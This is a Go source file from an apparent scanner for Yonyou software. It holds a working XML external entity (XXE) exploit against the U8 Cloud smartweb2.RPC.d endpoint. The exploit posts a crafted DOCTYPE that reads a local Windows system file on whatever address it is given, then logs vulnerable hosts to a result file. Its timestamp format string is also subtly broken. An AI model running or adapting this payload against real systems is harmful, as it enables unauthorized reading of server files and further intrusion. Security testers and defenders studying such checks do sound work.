package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func Smartweb2XXEScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	smartweb2 := "用友U8 Cloud smartweb2.RPC.d XXE漏洞"
	urls := address + "/hrss/dorado/smartweb2.RPC.d?__rpc=true"
	response, _ := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM \"file:///C://windows//win.ini\" >]><rpc transaction=\"10\" method=\"resetPwd\"><vps><p name=\"__profileKeys\">%26Password;</p ></vps></rpc>"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "succeed=") || strings.Contains(string(body), "stackTrace") || strings.Contains(string(body), "app support") {
		result := smartweb2 + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, smartweb2, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, smartweb2)
		fmt.Println(output)
	}
}
